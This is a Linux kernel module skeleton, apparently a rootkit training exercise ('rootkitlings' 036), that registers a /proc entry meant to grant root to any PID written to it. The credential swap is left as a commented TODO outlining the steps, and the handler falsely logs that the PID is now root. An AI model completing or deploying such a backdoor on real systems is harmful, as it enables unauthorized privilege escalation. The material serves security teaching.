#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("036: give root to a specific PID");

#define PROC_NAME "rootkitlings_privpid"

static struct proc_dir_entry *proc_entry;

static ssize_t privpid_write(struct file *file, const char __user *buf,
                              size_t count, loff_t *ppos)
{
    char kbuf[32];
    long target_pid;
    struct task_struct *task;
    struct cred *new_cred;

    if (count >= sizeof(kbuf))
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    if (kstrtol(kbuf, 10, &target_pid) != 0) {
        pr_info("rootkitlings/036: invalid PID '%s'\n", kbuf);
        return -EINVAL;
    }

    pr_info("rootkitlings/036: escalating PID %ld to root\n", target_pid);

    // TODO(rootkitlings):
    //   1. rcu_read_lock()
    //   2. task = find_task_by_vpid(target_pid)
    //   3. if (!task) { rcu_read_unlock(); return -ESRCH; }
    //   4. rcu_read_unlock()
    //   5. new_cred = prepare_kernel_cred(NULL)
    //   6. if (new_cred) rcu_assign_pointer(task->real_cred, new_cred);
    //      et aussi task->cred = new_cred;
    //      (Note: c'est une approche simplifiee. En vrai il faudrait
    //       gerer le refcount de l'ancien cred.)
    //
    //   ~6 lignes.

    pr_info("rootkitlings/036: PID %ld is now root\n", target_pid);
    return count;
}

static const struct proc_ops privpid_ops = {
    .proc_write = privpid_write,
};

static int __init privpid_init(void)
{
    proc_entry = proc_create(PROC_NAME, 0600, NULL, &privpid_ops);
    if (!proc_entry) {
        pr_err("rootkitlings/036: failed to create /proc/%s\n", PROC_NAME);
        return -ENOMEM;
    }

    pr_info("rootkitlings/036: write a PID to /proc/%s to give it root\n",
            PROC_NAME);
    return 0;
}

static void __exit privpid_exit(void)
{
    proc_remove(proc_entry);
    pr_info("rootkitlings/036: /proc/%s removed\n", PROC_NAME);
}

module_init(privpid_init);
module_exit(privpid_exit);
